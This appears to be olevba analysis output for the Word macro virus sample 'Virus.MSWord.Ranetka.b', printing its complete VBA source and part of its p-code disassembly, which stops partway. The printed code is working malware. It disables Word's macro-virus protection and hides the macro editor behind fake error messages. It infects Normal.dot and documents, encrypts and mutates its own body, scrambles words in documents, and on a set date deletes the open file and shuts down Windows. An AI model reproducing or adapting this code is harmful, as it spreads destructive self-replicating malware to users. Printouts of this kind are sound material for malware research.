olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ranetka.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ranetka.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ranetka.bas 
in file: Virus.MSWord.Ranetka.b - OLE stream: 'Macros/VBA/Ranetka'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If ThisDocument = "Normal.dot" Then
Application.OnTime Now + TimeValue("00:00:10"), "Normal.Ranetka.Íåâåñòà"
Else
Application.OnTime Now + TimeValue("00:00:10"), "Project.Ranetka.Íåâåñòà"
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
End If
Application.Caption = "Microsoôt Worä": Application.EnableCancelKey = wdCancelDisabled
If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF11, wdKeyAlt), KeyCategory:=wdKeyCategoryMacro, Command:="application.Run Íåâåñòà"
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyF8, wdKeyAlt), KeyCategory:=wdKeyCategoryMacro, Command:="application.Run Íåâåñòà"
For i = 1 To CommandBars("Tools").Controls.Count
If CommandBars("Tools").Controls(i).Caption = "&Ìàêðîñ" Then CommandBars("Tools").Controls(i).Delete
If CommandBars("Tools").Controls(i).Caption = "&Øàáëîíû è íàäñòðîéêè..." Then CommandBars("Tools").Controls(i).Delete
Next i
End If
End Sub
Sub AutoOpen()
AutoExec
' by KoToV Vlasiha CopyLeft,
' Ranetka2000 Beta Version 1.2
' ýòî ñêðîìíîå ñóùåñòâî ÿâëÿåòñÿ ïðÿìûì ïîòîìêîì
' Word97.Ranetka, íàïèñàíî â äíè ñäà÷è âûïóñêíûõ
' ýêçàìåíîâ â øêîëå. Ïîñâÿùàåòñÿ ïîëíîñòüþ
' øêîëå èì. À.Ñ. Ïîïîâà è ìîåìó ó÷èòåëþ èíôîðìàòèêè.
' Ïðèâåò Ìîëîäîâó Å. è âñåìó AVP, à òàêæå Dr. Äðîíó
End Sub
Sub AutoClose()
Íåâåñòà
End Sub
Sub ToolsOptions()
With Options: .VirusProtection = True: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: .SaveNormalPrompt = False: End With: Íåâåñòà
End Sub
Sub ViewVBCode()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else ShowVisualBasicEditor = True
End Sub
Sub Organizer()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogOrganizer).Show
End Sub
Sub FileTemplates()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogToolsTemplates).Show
End Sub
Sub ToolsMacro()
Íåâåñòà: If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then ShowVisualBasicEditor = False: MsgBox "Not enough memory to execute process!", vbSystemModal, "Error Windows!" Else Word.Dialogs(wdDialogToolsMacro).Show
End Sub
Sub Íåâåñòà()
On Error Resume Next
If ThisDocument = "Normal.dot" Then
Set ad = ActiveDocument.VBProject.VBComponents
Set td = NormalTemplate.VBProject.VBComponents("Ranetka")
Else
Set ad = NormalTemplate.VBProject.VBComponents
Set td = ActiveDocument.VBProject.VBComponents("Ranetka")
End If
Roza
Luksemburg 0, td
Èíîïëàíåòíûé_ãîñòü td, ad
Luksemburg 1, td
KME td
If ThisDocument = "Normal.dot" Then
Application.OnTime Now + TimeValue("00:02:00"), "Normal.Ranetka.Íåâåñòà"
Else
Application.OnTime Now + TimeValue("00:02:00"), "Project.Ranetka.Íåâåñòà"
End If
End Sub
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
Private Function Roza()
If Mid(Application.UserName, 2, 1) + Mid(Application.UserName, 4, 1) <> "îà" Then
If WeekDay(Now) = vbSunday And Hour(Now) >= 21 Then
n1 = Int((Documents(1).Words.Count - 2) * Rnd + 1): n2 = Int((Documents(1).Words.Count - 2) * Rnd + 1)
Documents(1).Words(n1).Copy: tmp = Documents(1).Words(n2).Text
Documents(1).Words(n2).Paste: Documents(1).Words(n1).Text = tmp: Documents(1).Save
End If
If Day(Now()) = 23 And Month(Now()) = 4 Then
MsgBox "Ñåãîäíÿ ìîé Äåíü Ðîæäåíèÿ!!!" & vbCrLf & "ìíå ñåãîäíÿ èñïîëíèëîñü" & Year(Now()) - 1983 & " ëåò!", vbSystemModal, "ß îòäûõàþ!"
If Left(ActiveDocument.Name, 8) <> "Äîêóìåíò" Then name_ = ActiveDocument.FullName: ActiveDocument.Close wdPromptToSaveChanges, wdOriginalDocumentFormat: Kill name_: Tasks.ExitWindows
End If
End If
End Function
Private Function Luksemburg(doing, td)
On Error Resume Next
If doing = 1 Then
For i = td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 10 To (td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc)) - 2
my_body = td.CodeModule.lines(i, 1): wizard = Int((10 - 6) * Rnd + 5): body_fuck = "'" + Str(wizard)
For o = 1 To Len(my_body)
body_fuck = body_fuck + Chr$(Asc(Mid(my_body, o, 1)) + wizard)
Next o
Rem Mike8.026.10.00 12:28:34GoatW8-2.doc
bodyfuck = bodyfuck + body_fuck + vbCrLf
Next i
bodyfuck = Left(bodyfuck, Len(bodyfuck) - 2)
td.CodeModule.deletelines td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1, td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) - 2
td.CodeModule.insertlines td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1, bodyfuck
Else
For i = td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + 1 To (td.CodeModule.ProcCountLines("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc) + td.CodeModule.ProcStartLine("Èíîïëàíåòíûé_ãîñòü", vbext_pk_Proc)) - 2
my_body = td.CodeModule.lines(i, 1): wizard = Mid(td.CodeModule.lines(i, 1), 3, 1): body_fuck = ""
For o = 4 To Len(my_body)
body_fuck = body_fuck + Chr$(Asc(Mid(my_body, o, 1)) - wizard)
Next o
td.CodeModule.insertlines td.CodeModule.CountOfLines, body_fuck
Next i
End If
End Function
Private Function KME(td)
k = 1: Do While k <= 3
nomer_of = Int(((td.CodeModule.CountOfLines - 10) - 2) * Rnd + 1)
fuck = "Rem " + Application.UserName + Application.Version + Str$(Now) + ActiveDocument.Name
If Left$(td.CodeModule.lines(nomer_of, 1), 3) = "Rem" Then
td.CodeModule.deletelines nomer_of
Else
If Left$(td.CodeModule.lines(nomer_of - 1, 1), 3) <> "Rem" And Left$(td.CodeModule.lines(nomer_of + 1, 1), 3) <> "Rem" Then td.CodeModule.insertlines nomer_of, fuck
End If: k = k + 1
Loop
End Function
Sub AutoExit()
With Options: .VirusProtection = 1: End With
End Sub
Sub Èíîïëàíåòíûé_ãîñòü(td, ad)
' 7t€fivk€'D'Y[ypt/{k5JvklTvk|sl5spulz/83'{k5JvklTvk|sl5Jv|u{VmSpulz'4'870'2'}iJySm'2')Luk'Z|i)0
' 7Vwlu')jAc~pukv~zcz€z{ltcrv{v}5z€z)'Mvy'V|{w|{'Hz'*8
' 7Wypu{'*83')H{{ypi|{l']IfUhtl'D')'2'Joy+/:;0'2')Yhul{rh)'2'Joy+/:;0
' 6Vxotz&)72&sehuj
' 6Iruyk&)7
' 8Nwz(q(E(:(\w(il6Kw}v|
' 5Nk%fi3Nyjr-n.3Sfrj%B%'Wfsjypf'%Ymjs%J}ny%Xzg%Jqxj%fi3Wjrt{j%fi3Nyjr-n.
' 8Vm€|(q
' 8il6Quxwz|(*kBdqvlw{d{�{|mudsw|w~6{�{*
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ranetka.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Ranetka - 11686 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #2:
' 	Ld ThisDocument 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	IfBlock 
' Line #3:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0016 "Normal.Ranetka.Íåâåñòà"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:10"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0017 "Project.Ranetka.Íåâåñòà"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #6:
' 	Rem 0x0025 " Mike8.026.10.00 12:28:34GoatW8-2.doc"
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	LitStr 0x000E "Microsoôt Worä"
' 	Ld Application 
' 	MemSt Caption 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #11:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0017 "application.Run Íåâåñòà"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #12:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #13:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0017 "application.Run Íåâåñòà"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #15:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0007 "&Ìàêðîñ"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #16:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0018 "&Øàáëîíû è íàäñòðîéêè..."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub AutoOpen())
' Line #21:
' 	ArgsCall AutoExec 0x0000 
' Line #22:
' 	QuoteRem 0x0000 0x001B " by KoToV Vlasiha CopyLeft,"
' Line #23:
' 	QuoteRem 0x0000 0x001D " Ranetka2000 Beta Version 1.2"
' Line #24:
' 	QuoteRem 0x0000 0x002F " ýòî ñêðîìíîå ñóùåñòâî ÿâëÿåòñÿ ïðÿìûì ïîòîìêîì"
' Line #25:
' 	QuoteRem 0x0000 0x002F " Word97.Ranetka, íàïèñàíî â äíè ñäà÷è âûïóñêíûõ"
' Line #26:
' 	QuoteRem 0x0000 0x0029 " ýêçàìåíîâ â øêîëå. Ïîñâÿùàåòñÿ ïîëíîñòüþ"
' Line #27:
' 	QuoteRem 0x0000 0x0033 " øêîëå èì. À.Ñ. Ïîïîâà è ìîåìó ó÷èòåëþ èíôîðìàòèêè."
' Line #28:
' 	QuoteRem 0x0000 0x0032 " Ïðèâåò Ìîëîäîâó Å. è âñåìó AVP, à òàêæå Dr. Äðîíó"
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub AutoClose())
' Line #31:
' 	ArgsCall Íåâåñòà 0x0000 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub ToolsOptions())
' Line #34:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #35:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	ArgsCall Íåâåñòà 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub ViewVBCode())
' Line #40:
' 	Label Íåâåñòà 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitStr 0x0025 "Not enough memory to execute process!"
' 	Ld vbSystemModal 
' 	LitStr 0x000E "Error Windows!"
' 	ArgsCall MsgBox 0x0003 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' 	EndIf 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub Organizer())
' Line #43:
' 	Label Íåâåñòà 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitStr 0x0025 "Not enough memory to execute process!"
' 	Ld vbSystemModal 
' 	LitStr 0x000E "Error Windows!"
' 	ArgsCall MsgBox 0x0003 
' 	Else 
' 	BoSImplicit 
' 	Ld wdDialogOrganizer 
' 	Ld Word 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Sub FileTemplates())
' Line #46:
' 	Label Íåâåñòà 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitStr 0x0025 "Not enough memory to execute process!"
' 	Ld vbSystemModal 
' 	LitStr 0x000E "Error Windows!"
' 	ArgsCall MsgBox 0x0003 
' 	Else 
' 	BoSImplicit 
' 	Ld wdDialogToolsTemplates 
' 	Ld Word 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ToolsMacro())
' Line #49:
' 	Label Íåâåñòà 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitStr 0x0025 "Not enough memory to execute process!"
' 	Ld vbSystemModal 
' 	LitStr 0x000E "Error Windows!"
' 	ArgsCall MsgBox 0x0003 
' 	Else 
' 	BoSImplicit 
' 	Ld wdDialogToolsMacro 
' 	Ld Word 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub Íåâåñòà())
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	Ld ThisDocument 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	IfBlock 
' Line #54:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set ad 
' Line #55:
' 	SetStmt 
' 	LitStr 0x0007 "Ranetka"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set td 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set ad 
' Line #58:
' 	SetStmt 
' 	LitStr 0x0007 "Ranetka"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set td 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	ArgsCall Roza 0x0000 
' Line #61:
' 	LitDI2 0x0000 
' 	Ld td 
' 	ArgsCall Luksemburg 0x0002 
' Line #62:
' 	Ld td 
' 	Ld ad 
' 	ArgsCall Èíîïëàíåòíûé_ãîñòü 0x0002 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld td 
' 	ArgsCall Luksemburg 0x0002 
' Line #64:
' 	Ld td 
' 	ArgsCall KME 0x0001 
' Line #65:
' 	Ld ThisDocument 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	IfBlock 
' Line #66:
' 	Ld Now 
' 	LitStr 0x0008 "00:02:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0016 "Normal.Ranetka.Íåâåñòà"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	Ld Now 
' 	LitStr 0x0008 "00:02:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0017 "Project.Ranetka.Íåâåñòà"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndSub 
' Line #71:
' 	Rem 0x0025 " Mike8.026.10.00 12:28:34GoatW8-2.doc"
' Line #72:
' 	FuncDefn (Private Function Roza())
' Line #73:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0002 "îà"
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld Now 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0015 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #75:
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St n1 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St n2 
' Line #76:
' 	Ld n1 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Copy 0x0000 
' 	BoS 0x0000 
' 	Ld n2 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Then 
' 	St tmp 
' Line #77:
' 	Ld n2 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Paste 0x0000 
' 	BoS 0x0000 
' 	Ld tmp 
' 	Ld n1 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemLd Words 0x0001 
' 	MemSt Then 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #80:
' 	LitStr 0x001C "Ñåãîäíÿ ìîé Äåíü Ðîæäåíèÿ!!!"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0017 "ìíå ñåãîäíÿ èñïîëíèëîñü"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07BF 
' 	Sub 
' 	Concat 
' 	LitStr 0x0005 " ëåò!"
' 	Concat 
' 	Ld vbSystemModal 
' 	LitStr 0x000A "ß îòäûõàþ!"
' 	ArgsCall MsgBox 0x0003 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St name_ 
' 	BoS 0x0000 
' 	Ld wdPromptToSaveChanges 
' 	Ld wdOriginalDocumentFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0002 
' 	BoS 0x0000 
' 	Ld name_ 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndFunc 
' Line #85:
' 	FuncDefn (Private Function Luksemburg(doing, td))
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	Ld doing 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitDI2 0x000A 
' 	Add 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	Add 
' 	Paren 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #89:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St my_body 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	LitDI2 0x0006 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0005 
' 	Add 
' 	FnInt 
' 	St wizard 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld wizard 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St body_fuck 
' Line #90:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld my_body 
' 	FnLen 
' 	For 
' Line #91:
' 	Ld body_fuck 
' 	Ld my_body 
' 	Ld o 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld wizard 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St body_fuck 
' Line #92:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	Rem 0x0025 " Mike8.026.10.00 12:28:34GoatW8-2.doc"
' Line #94:
' 	Ld bodyfuck 
' 	Ld body_fuck 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	St bodyfuck 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld bodyfuck 
' 	Ld bodyfuck 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St bodyfuck 
' Line #97:
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	LitDI2 0x0002 
' 	Sub 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #98:
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld bodyfuck 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #99:
' 	ElseBlock 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	LitStr 0x0012 "Èíîïëàíåòíûé_ãîñòü"
' 	Ld vbext_pk_Proc 
' 	Ld td 
' 	MemLd CodeModule 
